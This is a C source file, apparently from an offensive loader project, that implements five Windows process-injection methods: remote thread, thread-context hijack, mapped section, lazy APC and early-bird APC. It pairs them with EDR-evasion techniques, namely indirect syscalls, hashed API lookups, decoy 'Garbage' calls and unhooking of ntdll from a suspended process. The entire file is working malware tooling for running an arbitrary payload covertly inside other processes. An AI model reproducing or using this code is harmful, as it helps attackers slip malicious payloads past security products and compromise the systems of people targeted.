#include "..\HeaderFiles\IndirectInjector.h"

EXTERN_C DWORD syscall_number = 0;
EXTERN_C ULONGLONG syscall_address = 0;
EXTERN_C void indirectSyscall(...);

void Garbage()
{
	for (int i = 0; i < 3; i++)
	{
		OFSTRUCT temp;
		Sleep(100);
		OpenFile((LPCSTR)"conf.txt", &temp, OF_READ);
		GetTickCount();
		Sleep(100);
		OpenFile((LPCSTR)"config.txt", &temp, OF_READ);
	}
}

void Unhook(node* head, const char* process_name, HANDLE target)
{
	HMODULE ntdll = NULL;
	HMODULE kernel32 = NULL;

	ntdll = custom_GetModuleHandle(0x7d4a738d);
	kernel32 = custom_GetModuleHandle(0x294e3ff5);

	ULONG_PTR pNtHeader;
	ULONG_PTR pFileHeader;
	ULONG_PTR pOptionalHeader;
	ULONG_PTR pSectionHeaders;
	unsigned int numberOfSections;

	PVOID pSectionVA;
	SIZE_T sizeToCopy;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	RtlZeroMemory_t pRtlZeroMemory = (RtlZeroMemory_t)custom_GetProcAddress(ntdll, 0xfc6e76b0);
	pRtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	pRtlZeroMemory(&pi, sizeof(pi));

	CreateProcessA_t pCreateProcessA = (CreateProcessA_t)custom_GetProcAddress(kernel32, 0xaeb52e19);
	pCreateProcessA(NULL, (LPSTR)process_name, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	Garbage();

	pNtHeader = (ULONG_PTR)ntdll + ((PIMAGE_DOS_HEADER)ntdll)->e_lfanew;
	pFileHeader = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)pNtHeader)->FileHeader;
	pOptionalHeader = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)pNtHeader)->OptionalHeader;

	pSectionHeaders = pOptionalHeader + ((PIMAGE_FILE_HEADER)pFileHeader)->SizeOfOptionalHeader;
	pSectionVA = (PVOID)((ULONG_PTR)ntdll + ((PIMAGE_SECTION_HEADER)pSectionHeaders)->VirtualAddress);
	sizeToCopy = ((PIMAGE_SECTION_HEADER)pSectionHeaders)->Misc.VirtualSize;

	SIZE_T memory_size = sizeToCopy;
	RtlAllocateHeap_t pRtlAllocateHeap = (RtlAllocateHeap_t)custom_GetProcAddress(ntdll, 0xc0b381da);
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
	PVOID buffer = pRtlAllocateHeap(ProcEnvBlk->ProcessHeap, HEAP_ZERO_MEMORY, memory_size);

	PSIZE_T bytesRead = NULL;
	NtReadVirtualMemory_t pNtReadVirtualMemory = (NtReadVirtualMemory_t)getAddressbyHash(head, 0xc24062e3);
	syscall_address = findSyscall((unsigned char*)pNtReadVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0xc24062e3);
	indirectSyscall(pi.hProcess, pSectionVA, buffer, sizeToCopy, bytesRead);

	Garbage();

	DWORD oldprotect1 = 0;
	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x82962c8);
	indirectSyscall(target, (PVOID*)&pSectionVA, &sizeToCopy, PAGE_READWRITE, &oldprotect1);

	Garbage();

	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x95f3a792);
	indirectSyscall(target, pSectionVA, buffer, sizeToCopy, NULL);

	Garbage();

	DWORD oldprotect2 = 0;
	pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x82962c8);
	indirectSyscall(target, (PVOID*)&pSectionVA, &sizeToCopy, oldprotect1, &oldprotect2);
}

#ifdef THREADINJECTION
void ThreadInjection(node* head, const char* process_name, unsigned char* payload, SIZE_T payload_len) {
	int pid = 0;
	pid = FindTarget(process_name);
	OBJECT_ATTRIBUTES attributes;
	InitializeObjectAttributes(&attributes, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)pid;
	cid.UniqueThread = (HANDLE)0;

	HANDLE hProc = NULL;
	NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)getAddressbyHash(head, 0x5003c058);
	syscall_address = findSyscall((unsigned char*)pNtOpenProcess);
	syscall_number = getSyscallbyHash(head, 0x5003c058);
	indirectSyscall(&hProc, PROCESS_ALL_ACCESS, &attributes, &cid);

	LPVOID pRemoteCode = NULL;
	SIZE_T memorySize = payload_len;
	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)getAddressbyHash(head, 0x6793c34c);
	syscall_address = findSyscall((unsigned char*)pNtAllocateVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x6793c34c);
	indirectSyscall(hProc, (PVOID*)&pRemoteCode, NULL, &memorySize, MEM_COMMIT, PAGE_READWRITE);

	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x95f3a792);
	indirectSyscall(hProc, pRemoteCode, payload, payload_len, NULL);

	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x82962c8);
	indirectSyscall(hProc, (PVOID*)&pRemoteCode, &memorySize, PAGE_EXECUTE_READ, &oldprotect);

	HANDLE hThread = NULL;
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)getAddressbyHash(head, 0xcb0c2130);
	syscall_address = findSyscall((unsigned char*)pNtCreateThreadEx);
	syscall_number = getSyscallbyHash(head, 0xcb0c2130);
	indirectSyscall(&hThread, THREAD_ALL_ACCESS, &attributes, hProc, pRemoteCode, NULL, 0, 0, 0, 0, NULL);
}
#endif

#ifdef CONTEXTINJECTION
void ContextInjection(node* head, const char* process_name, unsigned char* payload, SIZE_T payload_len) {

	unsigned char* NTDLL_clean = NULL;
	SIZE_T NTDLL_size = 0;
	
	int pid = 0;
	pid = FindTarget(process_name);
	OBJECT_ATTRIBUTES attributes;
	InitializeObjectAttributes(&attributes, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)pid;
	cid.UniqueThread = (HANDLE)0;

	HANDLE hProc = NULL;
	NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)getAddressbyHash(head, 0x5003c058);
	syscall_address = findSyscall((unsigned char*)pNtOpenProcess);
	syscall_number = getSyscallbyHash(head, 0x5003c058);
	indirectSyscall(&hProc, PROCESS_ALL_ACCESS, &attributes, &cid);

	Garbage();

	HANDLE threads[20];
	unsigned int n_threads = 0;
	FindThread(pid, threads, &n_threads);

	LPVOID pRemoteCode = NULL;
	SIZE_T memorySize = payload_len;
	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)getAddressbyHash(head, 0x6793c34c);
	syscall_address = findSyscall((unsigned char*)pNtAllocateVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x6793c34c);
	indirectSyscall(hProc, (PVOID*)&pRemoteCode, NULL, &memorySize, MEM_COMMIT, PAGE_READWRITE);

	Garbage();

	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x95f3a792);
	indirectSyscall(hProc, pRemoteCode, payload, payload_len, NULL);

	Garbage();

	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x82962c8);
	indirectSyscall(hProc, (PVOID*)&pRemoteCode, &memorySize, PAGE_EXECUTE_READ, &oldprotect);

	Garbage();

	for (int i = 0; i < n_threads; i++)
	{
		NtSuspendThread_t pNtSuspendThread = (NtSuspendThread_t)getAddressbyHash(head, 0x50febd61);
		syscall_address = findSyscall((unsigned char*)pNtSuspendThread);
		syscall_number = getSyscallbyHash(head, 0x50febd61);
		indirectSyscall(threads[i], NULL);
	}

	Garbage();

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	NtGetContextThread_t pNtGetContextThread = (NtGetContextThread_t)getAddressbyHash(head, 0x9e0e1a44);
	syscall_address = findSyscall((unsigned char*)pNtGetContextThread);
	syscall_number = getSyscallbyHash(head, 0x9e0e1a44);
	indirectSyscall(threads[0], &ctx);

	Garbage();
	
	ctx.Rip = (DWORD_PTR)pRemoteCode;
	NtSetContextThread_t pNtSetContextThread = (NtSetContextThread_t)getAddressbyHash(head, 0x308be0d0);
	syscall_address = findSyscall((unsigned char*)pNtSetContextThread);
	syscall_number = getSyscallbyHash(head, 0x308be0d0);
	indirectSyscall(threads[0], &ctx);
	GetLastError();
	Unhook(head, process_name, hProc);
	GetLastError();
	Garbage();

	for (int i = 0; i < n_threads; i++)
	{
		NtResumeThread_t pNtResumeThread = (NtResumeThread_t)getAddressbyHash(head, 0x2c7b3d30);
		syscall_address = findSyscall((unsigned char*)pNtResumeThread);
		syscall_number = getSyscallbyHash(head, 0x2c7b3d30);
		pNtResumeThread(threads[i], NULL);
	}
}
#endif

#ifdef MAPVIEWINJECTION
void MapViewInjection(node* head, const char* process_name, unsigned char* payload, SIZE_T payload_len) {
	int pid = 0;
	pid = FindTarget(process_name);
	OBJECT_ATTRIBUTES attributes;
	InitializeObjectAttributes(&attributes, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)pid;
	cid.UniqueThread = (HANDLE)0;

	HANDLE hProc = NULL;
	NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)getAddressbyHash(head, 0x5003c058);
	syscall_address = findSyscall((unsigned char*)pNtOpenProcess);
	syscall_number = getSyscallbyHash(head, 0x5003c058);
	indirectSyscall(&hProc, PROCESS_ALL_ACCESS, &attributes, &cid);

	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize = { payload_len };
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t)getAddressbyHash(head, 0xd02e20d0);
	syscall_address = findSyscall((unsigned char*)pNtCreateSection);
	syscall_number = getSyscallbyHash(head, 0xd02e20d0);
	indirectSyscall(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	
	PVOID pLocalView = NULL;
	PVOID pRemoteView = NULL;

	SIZE_T viewSize = payload_len;
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)getAddressbyHash(head, 0x231f196a);
	syscall_address = findSyscall((unsigned char*)pNtMapViewOfSection);
	syscall_number = getSyscallbyHash(head, 0x231f196a);
	indirectSyscall(hSection, (HANDLE)-1, &pLocalView, 0, 0, NULL, &viewSize, ViewUnmap, NULL, PAGE_READWRITE);

	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x95f3a792);
	indirectSyscall((HANDLE)-1, pLocalView, payload, payload_len, NULL);

	viewSize = payload_len;
	syscall_address = findSyscall((unsigned char*)pNtMapViewOfSection);
	syscall_number = getSyscallbyHash(head, 0x231f196a);
	indirectSyscall(hSection, hProc, &pRemoteView, 0, 0, NULL, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	HANDLE hThread = NULL;
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)getAddressbyHash(head, 0xcb0c2130);
	syscall_address = findSyscall((unsigned char*)pNtCreateThreadEx);
	syscall_number = getSyscallbyHash(head, 0xcb0c2130);
	indirectSyscall(&hThread, THREAD_ALL_ACCESS, &attributes, hProc, pRemoteView, NULL, 0, 0, 0, 0, NULL);
}
#endif

#ifdef APCLAZYINJECTION
void APCLazyInjection(node* head, const char* process_name, unsigned char* payload, SIZE_T payload_len) {
	int pid = 0;
	pid = FindTarget(process_name);
	OBJECT_ATTRIBUTES attributes;
	InitializeObjectAttributes(&attributes, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)pid;
	cid.UniqueThread = (HANDLE)0;

	HANDLE hProc = NULL;
	NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)getAddressbyHash(head, 0x5003c058);
	syscall_address = findSyscall((unsigned char*)pNtOpenProcess);
	syscall_number = getSyscallbyHash(head, 0x5003c058);
	indirectSyscall(&hProc, PROCESS_ALL_ACCESS, &attributes, &cid);

	HANDLE threads[20];
	unsigned int n_threads = 0;
	FindThread(pid, threads, &n_threads);

	LPVOID pRemoteCode = NULL;
	SIZE_T memorySize = payload_len;
	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)getAddressbyHash(head, 0x6793c34c);
	syscall_address = findSyscall((unsigned char*)pNtAllocateVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x6793c34c);
	indirectSyscall(hProc, (PVOID*)&pRemoteCode, NULL, &memorySize, MEM_COMMIT, PAGE_READWRITE);

	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x95f3a792);
	indirectSyscall(hProc, pRemoteCode, payload, payload_len, NULL);

	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x82962c8);
	indirectSyscall(hProc, (PVOID*)&pRemoteCode, &memorySize, PAGE_EXECUTE_READ, &oldprotect);
	/*for (int i = 0; i < n_threads; i++)
	{
		Sleep(5*1000);
		NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
		syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
		syscall_number = getSyscallbyHash(head, 0xd4612238);
		indirectSyscall(threads[i], pRemoteCode, NULL, NULL, 0);
	}*/
	NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
	syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
	syscall_number = getSyscallbyHash(head, 0xd4612238);
	indirectSyscall(threads[0], pRemoteCode, NULL, NULL, 0);
}
#endif

#ifdef APCEAGERINJECTION
void APCEagerInjection(node* head, const char* process_name, unsigned char* payload, SIZE_T payload_len) {
	HMODULE ntdll = NULL;
	HMODULE kernel32 = NULL;
	ntdll = custom_GetModuleHandle(0x7d4a738d);
	kernel32 = custom_GetModuleHandle(0x294e3ff5);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	RtlZeroMemory_t pRtlZeroMemory = (RtlZeroMemory_t)custom_GetProcAddress(ntdll, 0xfc6e76b0);
	pRtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	pRtlZeroMemory(&pi, sizeof(pi));

	CreateProcessA_t pCreateProcessA = (CreateProcessA_t)custom_GetProcAddress(kernel32, 0xaeb52e19);
	pCreateProcessA(NULL, (LPSTR)process_name, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	LPVOID pRemoteCode = NULL;
	SIZE_T memorySize = payload_len;
	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)getAddressbyHash(head, 0x6793c34c);
	syscall_address = findSyscall((unsigned char*)pNtAllocateVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x6793c34c);
	indirectSyscall(pi.hProcess, (PVOID*)&pRemoteCode, NULL, &memorySize, MEM_COMMIT, PAGE_READWRITE);

	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x95f3a792);
	indirectSyscall(pi.hProcess, pRemoteCode, payload, payload_len, NULL);

	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
	syscall_number = getSyscallbyHash(head, 0x82962c8);
	indirectSyscall(pi.hProcess, (PVOID*)&pRemoteCode, &memorySize, PAGE_EXECUTE_READ, &oldprotect);

	NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
	syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
	syscall_number = getSyscallbyHash(head, 0xd4612238);
	indirectSyscall(pi.hThread, pRemoteCode, NULL, NULL, 0);

	NtResumeThread_t pNtResumeThread = (NtResumeThread_t)getAddressbyHash(head, 0x2c7b3d30);
	syscall_address = findSyscall((unsigned char*)pNtResumeThread);
	syscall_number = getSyscallbyHash(head, 0x2c7b3d30);
	pNtResumeThread(pi.hThread, NULL);
}
#endif